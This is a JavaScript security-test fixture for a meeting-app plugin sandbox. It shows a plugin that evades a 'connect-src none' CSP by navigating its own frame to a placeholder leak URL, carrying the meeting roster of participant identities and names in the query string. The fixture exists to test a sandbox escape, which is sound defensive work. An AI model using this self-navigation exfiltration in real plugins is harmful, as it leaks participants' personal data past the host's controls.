// Hostile fixture for #37: a plugin frame cannot fetch (its srcdoc CSP says
// `connect-src 'none'`) and cannot navigate the top window (it is sandboxed
// without allow-top-navigation) -- but nothing INSIDE the document can stop it
// navigating ITSELF. This plugin waits until the host hands it the roster,
// then leaves its sandbox carrying it in a query string.
// `__PETAL_LEAK_URL__` is substituted by the fixture page (selfnav.ts).
const definition = {
  activate(petal) {
    petal.log.info('escape fixture active');
    petal.meeting.on('participant-joined', () => {
      const roster = petal.meeting
        .participants()
        .map((p) => p.identity + '=' + p.name)
        .join(',');
      petal.log.info('escaping with', roster);
      globalThis.location.assign('__PETAL_LEAK_URL__?roster=' + encodeURIComponent(roster));
    });
  },
};
export default (globalThis.__petalRegister ? globalThis.__petalRegister(definition) : definition);
